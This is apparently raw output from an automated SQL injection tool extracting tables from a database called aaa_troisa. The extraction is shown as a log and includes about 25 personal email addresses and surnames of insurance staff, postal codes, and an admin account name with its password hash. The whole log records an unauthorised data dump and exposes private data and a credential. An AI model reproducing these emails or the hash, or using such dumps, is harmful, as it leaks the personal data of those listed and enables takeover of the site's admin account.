+Data Found: email_annu,nom_annu=olivier.wils@marsh.com ^WILS
+Data Found: email_annu,nom_annu=marie.gauliard@albingia.fr^GAULIARD
+Data Found: email_annu,nom_annu=patrick.cardosi@accsgouy.com^CARDOSI
+Data Found: email_annu,nom_annu=anne.guerin@acegroup.com^GUERIN
+Data Found: email_annu,nom_annu=christophe.marliere@grassavoye.com^MARLIERE
+Data Found: email_annu,nom_annu=fabrice.leclerc_2@allianz.fr^LECLERC
+Data Found: email_annu,nom_annu=stephanie.malingue@s2hgroup.com^MALINGUE
+Data Found: email_annu,nom_annu=jean-baptiste.regnier@allianz.com^REGNIER
+Data Found: email_annu,nom_annu=daniel.henocq@scalassur.fr^HENOCK
+Data Found: email_annu,nom_annu=Patrick.Grard@chartisinsurance.com^GRARD
+Data Found: email_annu,nom_annu=jrenauld@ortassurances.fr^RENAULD
+Data Found: email_annu,nom_annu=jean-pierre.rouquet@april.com^ROUQUET
+Data Found: email_annu,nom_annu=berengere.de.malartic@grassavoye.com^DE MALARTIC
+Data Found: email_annu,nom_annu=t.derubay@declarens.com^DERUBAY
+Data Found: email_annu,nom_annu=pinon@groupe-satec.com^PINON
+Data Found: email_annu,nom_annu=jeanluc.mabboux@free.fr^MABBOUX
+Data Found: email_annu,nom_annu=patrice.angelo@allianz.fr^ANGELO
+Data Found: email_annu,nom_annu=pascale.martineau@aig.com^MARTINEAU
+Data Found: email_annu,nom_annu=jdacunha@afs-securite.fr^DA CUNHA
+Data Found: email_annu,nom_annu=mustapha.ahmine@albingia.fr^AHMINE
+Data Found: email_annu,nom_annu=tsans@protec-feu-rs.fr^SANS
+Data Found: email_annu,nom_annu=6565^mirage
+Data Found: email_annu,nom_annu=vnioloux@amlinfrance.com^NIOLOUX
+Data Found: email_annu,nom_annu=didiercazenave@aol.com^CAZENAVE
+Data Found: email_annu,nom_annu=bertrand.degremont@aig.com^DEGREMONT
+Count(*) of aaa_troisa.articles is 0
+Can not get rows count, trying to get 10 rows
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Canceling...
+Data Found: id_cat=
+Data Found: id_cat=
+Data Found: id_cat=
+Job Canceled!
+Count(*) of aaa_troisa.annuaire is 93
+Data Found: cppro_annu=
+Data Found: cppro_annu=75008
+Data Found: cppro_annu=75008
+Data Found: cppro_annu=
+Data Found: cppro_annu=75009
+Data Found: cppro_annu=92271
+Data Found: cppro_annu=92202
+Data Found: cppro_annu=
+Data Found: cppro_annu=75009 
+Data Found: cppro_annu=75008
+Data Found: cppro_annu=75002
+Data Found: cppro_annu=
+Data Found: cppro_annu=75010
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Data Found: cppro_annu=35510
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Canceling...
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Data Found: id_cat=
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Data Found: cppro_annu=
+Job Canceled!
+Count(*) of aaa_troisa.annuaire is 93
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=75008^
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=92271^
+Data Found: cppro_annu,comment_annu=75009 ^
+Data Found: cppro_annu,comment_annu=75009^
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=75002^
+Data Found: cppro_annu,comment_annu=75008^
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=35510^
+Data Found: cppro_annu,comment_annu=^Retrait
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=92202^
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=^
+Canceling...
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=92271^
+Data Found: cppro_annu,comment_annu=
+Data Found: cppro_annu,comment_annu=^
+Data Found: cppro_annu,comment_annu=92600^
+Data Found: cppro_annu,comment_annu=92600^
+Data Found: cppro_annu,comment_annu=
+Job Canceled!
+Count(*) of aaa_troisa.comptes_admin is 1
+Data Found: cpte_ad,sesam=louvre^ccbee73cd81c7f42405e1920409247ec
